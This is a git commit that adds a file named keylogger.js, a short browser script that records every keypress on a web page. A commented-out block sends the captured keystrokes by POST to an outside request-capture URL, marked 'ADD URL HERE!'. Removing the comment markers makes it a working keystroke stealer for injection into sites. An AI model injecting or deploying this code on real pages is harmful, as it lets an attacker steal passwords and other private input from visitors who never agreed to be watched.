ba54bf8078162f79a7d1dbb6aea56ed62ebc098e
mrlongsword <60816759+mrlongsword@users.noreply.github.com>
2022-05-24 21:13:23 +0800

    Create keylogger.js

---
+++ keylogger.js
@@ -0,0 +1,13 @@
+<script type="text/javascript">
+    var l = "";             // empty string to concatenate keys onto
+    document.onkeypress = function (e) {
+        l += e.key;
+
+        /*
+        var req = new XMLHttpRequest();
+        req.open("POST","https://enlla50zbrfe.x.pipedream.net/", true); 				// ADD URL HERE!
+        req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+        req.send("data=" + l);
+        */
+    }
+</script>
